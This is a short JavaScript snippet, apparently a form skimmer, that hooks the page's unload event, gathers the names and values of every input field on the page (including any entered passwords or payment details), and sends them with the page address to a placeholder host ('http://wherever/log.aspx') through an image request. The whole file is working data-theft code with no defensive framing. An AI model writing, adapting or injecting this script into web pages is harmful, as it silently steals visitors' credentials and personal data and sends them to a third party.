document.getElementsByTagName("body")[0].setAttribute("onunload","postData()");

function postData() {

        var output = "page="+document.location;
        var inputs, index;

        inputs = document.getElementsByTagName('input');
        for (index = 0; index < inputs.length; ++index) {
                input_name = inputs[index].id || inputs[index].name;
                output = output + "&" + input_name + "=" + inputs[index].value;
        }

        output = encodeURI(output);

        console.log(output);

        new Image().src = "http://wherever/log.aspx?"+output;

}